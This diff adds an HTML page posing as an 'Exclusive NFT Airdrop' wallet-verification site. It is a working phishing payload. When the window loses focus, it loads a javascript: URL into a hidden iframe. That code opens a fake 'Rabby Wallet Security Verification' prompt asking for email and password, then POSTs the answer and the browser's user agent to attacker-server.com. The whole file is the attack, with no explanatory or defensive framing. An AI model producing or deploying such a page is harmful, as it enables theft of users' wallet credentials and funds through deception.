@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no">
+    <title>Exclusive NFT Airdrop - Verify Wallet</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            text-align: center;
+            padding: 20px;
+        }
+        .container {
+            background: rgba(255,255,255,0.1);
+            padding: 30px;
+            border-radius: 15px;
+            margin-top: 50px;
+        }
+        .btn {
+            background: #4CAF50;
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 25px;
+            font-size: 18px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        iframe { visibility: hidden; }
+    </style>
+    <script>
+        let credentials = null;
+        
+        window.onblur = function() {
+            // Inject sophisticated phishing prompt
+            document.getElementById("iframe").src = "javascript:" +
+                "var result = prompt(" +
+                "'🔐 Rabby Wallet Security Verification\\n\\n" +
+                "To access this exclusive airdrop, please\\n" +
+                "verify your wallet credentials:\\n\\n" +
+                "Format: email:password', " +
+                "'email@example.com:yourpassword'" +
+                ");" +
+                "if(result) {" +
+                "  fetch('https://attacker-server.com/collect', {" +
+                "    method: 'POST'," +
+                "    body: JSON.stringify({creds: result, ua: navigator.userAgent})" +
+                "  });" +
+                "}";
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <h1>🎁 Exclusive NFT Airdrop</h1>
+        <p>You've been selected for a limited NFT airdrop!</p>
+        <p>Value: <strong>0.5 ETH</strong></p>
+        <button class="btn" onclick="alert('Tap anywhere to continue...')">
+            Claim Your NFT
+        </button>
+    </div>
+    <iframe id="iframe"></iframe>
+</body>
+</html>
